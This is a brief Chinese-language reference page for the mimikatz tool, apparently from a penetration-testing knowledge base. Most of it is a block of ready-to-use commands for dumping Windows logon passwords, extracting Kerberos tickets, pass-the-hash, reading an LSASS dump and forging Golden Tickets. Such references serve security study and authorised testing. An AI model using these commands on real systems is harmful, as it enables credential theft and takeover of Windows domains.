# mimikatz

## 简介
Windows 凭据提取工具，提取明文密码和哈希

## 核心参数
- Windows 下运行
- 需要管理员权限

## 命令示例
```bash
# 提权到 SYSTEM
privilege::debug

# 提取明文密码
sekurlsa::logonpasswords

# 提取 Kerberos 票据
sekurlsa::tickets

# Pass-the-Hash
sekurlsa::pth /user:admin /domain:domain.com /ntlm:hash /run:cmd.exe

# 导出所有凭据
sekurlsa::minidump lsass.dmp

# Golden Ticket
kerberos::golden /user:admin /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:hash /id:500
```

## 使用场景
Windows 系统上提取凭据和票据

## 所属分类
- [Pass-the-Hash 攻击 (Pass-the-Hash)](../categories/13-pass-the-hash.md)
